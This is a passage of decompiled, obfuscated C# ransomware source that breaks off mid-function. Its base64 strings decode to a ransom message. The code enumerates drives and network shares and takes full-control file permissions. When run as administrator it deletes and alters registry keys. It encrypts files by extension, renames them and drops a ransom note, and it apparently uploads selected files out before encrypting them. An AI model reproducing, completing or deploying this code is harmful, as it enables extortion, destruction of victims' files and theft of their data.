				if (AFeeYbGHoUrNo == getString_0(107396740) && !string.IsNullOrEmpty(iTDKzcQgCP) && !string.IsNullOrEmpty(vIamCfVWgLiDG))
				{
					xMFeNwpcrJK(getString_0(107393117), iTDKzcQgCP, vIamCfVWgLiDG);
				}
				else
				{
					xMFeNwpcrJK(getString_0(107393117), getString_0(107393074), getString_0(107393045));
				}
			}
		}
		catch
		{
		}
	}

	public static void VGEBiJRmUASQ(string dnBoppKQhr = "SW5mb3JtYXRpb24uLi4=", string twfOszvawwJosX = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(BaxqkGxiBeqS(dnBoppKQhr));
		val.set_BalloonTipText(BaxqkGxiBeqS(twfOszvawwJosX));
		val.ShowBalloonTip(30000);
	}

	public static void vbVjidfpteXm(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		nOIZGFqjik(getString_0(107391563), getString_0(107391518) + text + getString_0(107391509) + string_0);
	}

	private static void gstRUQFlqobUGB()
	{
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Expected O, but got Unknown
		//IL_02c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		UuSLZKGmBaNIY();
		List<iYKZwhsUuRjETL> list = iYKZwhsUuRjETL.iAjpIsqdyyOg();
		foreach (iYKZwhsUuRjETL item in list)
		{
			txWDykcdpRIUT.Add(item.IPAddress);
		}
		List<string> source = txWDykcdpRIUT;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
			{
				vpbfbIAWAYvUfQ CS_0024_003C_003E8__locals0 = new vpbfbIAWAYvUfQ();
				CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ = string_0;
				if ((!CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388338)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388365)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107388356)) && !CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ.StartsWith(getString_0(107393117))) || !HNDBddbMue.NhBKYOYAcHZTx(CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ))
				{
					return;
				}
				try
				{
					Thread.Sleep(XvWBphKuRyvD);
					QuXRcyqyIgSTxy.Add(getString_0(107391902) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + getString_0(107388311));
					try
					{
						if (gSSiJyrGCBHZ)
						{
							Console.WriteLine(getString_0(107391902) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + getString_0(107388311));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(XvWBphKuRyvD);
						QuXRcyqyIgSTxy.Add(vpbfbIAWAYvUfQ.getString_0(107391908) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + vpbfbIAWAYvUfQ.getString_0(107397116) + (char)int_0 + vpbfbIAWAYvUfQ.getString_0(107405057));
						try
						{
							if (gSSiJyrGCBHZ)
							{
								Console.WriteLine(vpbfbIAWAYvUfQ.getString_0(107391908) + CS_0024_003C_003E8__locals0.dozAlNcIgjCiZ + vpbfbIAWAYvUfQ.getString_0(107397116) + (char)int_0 + vpbfbIAWAYvUfQ.getString_0(107405057));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
		try
		{
			if (gSSiJyrGCBHZ)
			{
				Console.WriteLine(getString_0(107391536));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = SqbUSPIscVoYxhFbFA(getString_0(107391186));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391495)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391438)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (MmTRHWEtabs == getString_0(107396740))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107391361), getString_0(107391352));
				File.WriteAllText(text, BaxqkGxiBeqS(getString_0(107391375)), Encoding.ASCII);
				nOIZGFqjik(getString_0(107397132), getString_0(107389777) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107389772))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107389772)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107389763))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107389763)));
				}
			}
			catch
			{
			}
		}
		try
		{
			if (gSSiJyrGCBHZ)
			{
				Console.WriteLine(getString_0(107389722));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391955));
		ManagementObjectEnumerator enumerator2 = val.Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator2.get_Current();
				if (QuXRcyqyIgSTxy.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391902), getString_0(107397110)).Replace(getString_0(107391897), getString_0(107391902))
					.Replace(getString_0(107391920), getString_0(107393117))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (gSSiJyrGCBHZ)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391902), getString_0(107397110)).Replace(getString_0(107391897), getString_0(107391902))
							.Replace(getString_0(107391920), getString_0(107393117))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391915), getString_0(107393117)));
					}
				}
				catch
				{
				}
				QuXRcyqyIgSTxy.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391902), getString_0(107397110)).Replace(getString_0(107391897), getString_0(107391902))
					.Replace(getString_0(107391920), getString_0(107393117))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391915), getString_0(107393117)));
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		try
		{
			if (gSSiJyrGCBHZ)
			{
				Console.WriteLine(getString_0(107389665));
			}
		}
		catch
		{
		}
	}

	public static void zyaalHhzPWGp(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = BaxqkGxiBeqS(getString_0(107389596));
		processStartInfo.Arguments = getString_0(107389567) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool mxEIGQblxg(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string xsxPtqnBjsRCH(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void GNwqxUGaeE()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = SqbUSPIscVoYxhFbFA(getString_0(107389562));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389968)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389911)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389926)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389901)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389596)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389844)));
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389815)));
					registryKey.Close();
				}
				string_ = SqbUSPIscVoYxhFbFA(getString_0(107389830));
				registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389221)));
					registryKey.Close();
				}
				string_ = SqbUSPIscVoYxhFbFA(getString_0(107389172));
				registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389221)));
					registryKey.Close();
				}
				string_ = SqbUSPIscVoYxhFbFA(getString_0(107389172));
				registryKey = Registry.CurrentUser.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(BaxqkGxiBeqS(getString_0(107389221)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107389187)), BaxqkGxiBeqS(getString_0(107389138)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107389089)), BaxqkGxiBeqS(getString_0(107389080)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107389089)), BaxqkGxiBeqS(getString_0(107389478)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107389417)), BaxqkGxiBeqS(getString_0(107389368)));
		}
		catch
		{
		}
	}

	public static void yirsdStUbSe(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(BaxqkGxiBeqS(getString_0(107389327)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void mhUKLqveIkl()
	{
		string string_ = SqbUSPIscVoYxhFbFA(getString_0(107388758));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(BaxqkGxiBeqS(getString_0(107388709)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void UuSLZKGmBaNIY()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107396445)), BaxqkGxiBeqS(getString_0(107396464)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107396445)), BaxqkGxiBeqS(getString_0(107388676)));
		}
	}

	public static void itRibalZUGJhza()
	{
		nOIZGFqjik(getString_0(107397132), BaxqkGxiBeqS(getString_0(107389010)));
		string text = BaxqkGxiBeqS(getString_0(107388848));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391920) + text + getString_0(107391920) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397132);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void RhuDTDuXfGTW(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(UQSYzQClpMD, getString_0(107388271) + string_0 + getString_0(107388262) + ex.Message + getString_0(107396593));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string PxuvQHOJlLM()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393117);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107388173);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107388196))) ? getString_0(107388146) : getString_0(107388155));
				break;
			case 0:
				text = getString_0(107388201);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107388168);
				break;
			case 4:
				text = getString_0(107388123);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388137) : getString_0(107388114));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107388113) : getString_0(107388086)) : getString_0(107388091)) : getString_0(107388132));
				break;
			case 10:
				text = getString_0(107388108);
				break;
			}
		}
		if (text != getString_0(107393117))
		{
			text = getString_0(107388103) + text;
			if (oSVersion.ServicePack != getString_0(107393117))
			{
				text = text + getString_0(107391509) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string LOHHDmNGQodDm(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395634);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107395633)));
				streamWriter.WriteLine(getString_0(107396593));
				streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107393615)));
				streamWriter.WriteLine(string_0);
				if (VVuqpZMWeENUoLrM)
				{
					streamWriter.WriteLine(getString_0(107396593));
					streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107393473)));
					streamWriter.WriteLine(jCOJRzSaQahQUJH.FdEYtmTMffelS());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !nzkUSgBdGXcD)
				{
					File.AppendAllText(text, getString_0(107393440) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(UQSYzQClpMD, getString_0(107388058) + ex.Message + getString_0(107396593));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void cooiokXvhe(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		GbxlAQlQHmnHrp.aflNftZKgNUW CS_0024_003C_003E8__locals0 = new GbxlAQlQHmnHrp();
		CS_0024_003C_003E8__locals0.DsVmeoUgKN = string_1;
		CS_0024_003C_003E8__locals0.yZOxevKzEIK = string_2;
		CS_0024_003C_003E8__locals0.XLsIKvSOSiTpLW = string_3;
		CS_0024_003C_003E8__locals0.jEiBZhFgEnbIo = string_4;
		PUSRZdlFWQWg = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.XLsIKvSOSiTpLW);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395817))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !QuXRcyqyIgSTxy.Contains(array[i].Name))
					{
						QuXRcyqyIgSTxy.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!QuXRcyqyIgSTxy.Contains(string_0[j]))
				{
					QuXRcyqyIgSTxy.Add(string_0[j]);
				}
			}
		}
		if (QuXRcyqyIgSTxy.Contains(BaxqkGxiBeqS(getString_0(107388513))) && PmRBdqDbAECqW == getString_0(107396740))
		{
			QuXRcyqyIgSTxy.Remove(BaxqkGxiBeqS(getString_0(107388513)));
		}
		Parallel.ForEach(QuXRcyqyIgSTxy, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new GbxlAQlQHmnHrp.aflNftZKgNUW();
			CS_0024_003C_003E8__locals0.mwdfCPznVTiz = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.eJUHJSZrrQt = string_0;
			if (CZxXSwBijFtPD && !PxuvQHOJlLM().Contains(GbxlAQlQHmnHrp.getString_0(107388148)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						mxEIGQblxg(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.eJUHJSZrrQt);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (VRPOZozIAQYe == GbxlAQlQHmnHrp.getString_0(107396751))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					palyFKafVcK(CS_0024_003C_003E8__locals0.eJUHJSZrrQt, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.DsVmeoUgKN, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.jEiBZhFgEnbIo, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.yZOxevKzEIK, CS_0024_003C_003E8__locals0.mwdfCPznVTiz.XLsIKvSOSiTpLW);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				palyFKafVcK(CS_0024_003C_003E8__locals0.eJUHJSZrrQt, CS_0024_003C_003E8__locals0.DsVmeoUgKN, CS_0024_003C_003E8__locals0.jEiBZhFgEnbIo, CS_0024_003C_003E8__locals0.yZOxevKzEIK, CS_0024_003C_003E8__locals0.XLsIKvSOSiTpLW);
			}
		});
	}

	public static void palyFKafVcK(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393117));
		List<string> list3 = list2;
		if (sCXdylZCmGtbMZAS == getString_0(107397137))
		{
			list = fFKAoywEsvGmAlN(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = OYKIUFcwSfg.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((GgDaSwnIUzDUy == getString_0(107397137) && !item.EndsWith(text)) || diKnMADbMAYp.Contains(item))
				{
					continue;
				}
				if (JQZPkWnOzqnmK == getString_0(107396740))
				{
					try
					{
						if (JPlUIARxIoI.xRFTZTzbmDo(item))
						{
							JPlUIARxIoI.PKODcjuKIwO(item);
						}
					}
					catch
					{
					}
				}
				diKnMADbMAYp.Add(item);
				if (!BTRlqjNfLlWsE.Contains(Path.GetDirectoryName(item)))
				{
					BTRlqjNfLlWsE.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (lzqKhPamqvFJR == getString_0(107396740) && fileStream.Length > Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024 && !list3.Contains(text))
					{
						if (NQwCDAjXKTQu == getString_0(107396740))
						{
							foreach (string item2 in rtjfJHAbipnYF)
							{
								if (item.ToLower().EndsWith(item2) && OZzUcHNaqca == getString_0(107396740))
								{
									if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && OZzUcHNaqca == getString_0(107397137))
								{
									try
									{
										jCOJRzSaQahQUJH.PrZGmImJdFgV(getString_0(107392718), getString_0(107392713), getString_0(107392668), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = JODGCfeUBqfSiYrU.ZDfiLXsQVNoG(item, Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024);
						byte[] tmDAkSZaIXHu = JODGCfeUBqfSiYrU.RjhBaSeYoCMetj(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						JODGCfeUBqfSiYrU.xEZuYNVpsYfClBPn(item, tmDAkSZaIXHu);
						if (string_2 != getString_0(107388504))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107388504))
					{
						IIevsGYdXbA(item, item + string_2, PUSRZdlFWQWg);
					}
					else
					{
						IIevsGYdXbA(item, item + getString_0(107388499), PUSRZdlFWQWg);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void duXkyMVzMXQIVc(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		zSvtksGUxSCJaG.UAtGHiwhAxrl CS_0024_003C_003E8__locals0 = new zSvtksGUxSCJaG();
		CS_0024_003C_003E8__locals0.WtZodkqAZtX = list_0;
		CS_0024_003C_003E8__locals0.VbWVwrNehsYl = string_1;
		CS_0024_003C_003E8__locals0.LzVXgnnvTgpKaVb = string_2;
		CS_0024_003C_003E8__locals0.xmYLyARLYEl = string_3;
		CS_0024_003C_003E8__locals0.MARwAeVueRdw = new List<string> { getString_0(107393117) };
		if (GgDaSwnIUzDUy == getString_0(107397137))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WtZodkqAZtX)
				{
					if (CS_0024_003C_003E8__locals0.LzVXgnnvTgpKaVb.Length != 0)
					{
						string[] lzVXgnnvTgpKaVb2 = CS_0024_003C_003E8__locals0.LzVXgnnvTgpKaVb;
						int num2 = 0;
						while (num2 < lzVXgnnvTgpKaVb2.Length)
						{
							string value2 = lzVXgnnvTgpKaVb2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.VbWVwrNehsYl))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !diKnMADbMAYp.Contains(item))
					{
						if (JQZPkWnOzqnmK == zSvtksGUxSCJaG.getString_0(107396759))
						{
							try
							{
								if (JPlUIARxIoI.xRFTZTzbmDo(item))
								{
									JPlUIARxIoI.PKODcjuKIwO(item);
								}
							}
							catch
							{
							}
						}
						diKnMADbMAYp.Add(item);
						if (!BTRlqjNfLlWsE.Contains(Path.GetDirectoryName(item)))
						{
							BTRlqjNfLlWsE.Add(Path.GetDirectoryName(item));
						}
						RhuDTDuXfGTW(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (XKASwlGUBpzh)
								{
									try
									{
										File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + item + zSvtksGUxSCJaG.getString_0(107405065) + ex12.Message + zSvtksGUxSCJaG.getString_0(107396612));
									}
									catch (Exception)
									{
									}
								}
								xGavVPJiJhi++;
								goto end_IL_00ee_2;
							}
							if (lzqKhPamqvFJR == zSvtksGUxSCJaG.getString_0(107396759) && new FileInfo(item).Length > Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.MARwAeVueRdw.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new zSvtksGUxSCJaG.AfCAWljeyDFMF();
								CS_0024_003C_003E8__locals0.AhDWxIHxfl = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
									{
										if (VVuqpZMWeENUoLrM)
										{
											CS_0024_003C_003E8__locals0.VbWVwrNehsYl = lZgHybZuOJvtb + CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl);
									}
								}
								catch (Exception ex14)
								{
									if (XKASwlGUBpzh)
									{
										try
										{
											File.AppendAllText(UQSYzQClpMD, zSvtksGUxSCJaG.getString_0(107388290) + item + zSvtksGUxSCJaG.getString_0(107405004) + ex14.Message + zSvtksGUxSCJaG.getString_0(107396612));
										}
										catch (Exception)
										{
										}
									}
									xGavVPJiJhi++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.rmVQhBqqNF = zSvtksGUxSCJaG.getString_0(107393136);
								if (CS_0024_003C_003E8__locals0.VbWVwrNehsYl != zSvtksGUxSCJaG.getString_0(107388523))
								{
									CS_0024_003C_003E8__locals0.rmVQhBqqNF = item + CS_0024_003C_003E8__locals0.VbWVwrNehsYl;
								}
								else
								{
									CS_0024_003C_003E8__locals0.rmVQhBqqNF = item;
								}
								if (NQwCDAjXKTQu == zSvtksGUxSCJaG.getString_0(107396759))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in rtjfJHAbipnYF)
										{
											if (CS_0024_003C_003E8__locals0.rmVQhBqqNF.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.AhDWxIHxfl.VbWVwrNehsYl) && OZzUcHNaqca == zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107396762))
											{
												if (Convert.ToInt32(zVxtpLMtWN) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.rmVQhBqqNF).Length)
												{
													try
													{
														jCOJRzSaQahQUJH.PrZGmImJdFgV(zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392740), zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392735), zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392690), CS_0024_003C_003E8__locals0.rmVQhBqqNF);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.rmVQhBqqNF.ToLower().EndsWith(item2) && OZzUcHNaqca == zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107397159))
											{
												try
												{
													jCOJRzSaQahQUJH.PrZGmImJdFgV(zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392740), zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392735), zSvtksGUxSCJaG.AfCAWljeyDFMF.getString_0(107392690), CS_0024_003C_003E8__locals0.rmVQhBqqNF);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = QvsBSwYTyC.iYyUrROgryUA(32);
								string s3 = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = JODGCfeUBqfSiYrU.ZDfiLXsQVNoG(CS_0024_003C_003E8__locals0.rmVQhBqqNF, Convert.ToInt32(rwFJViTtnOvWkjuSM) * 1024 * 1024);
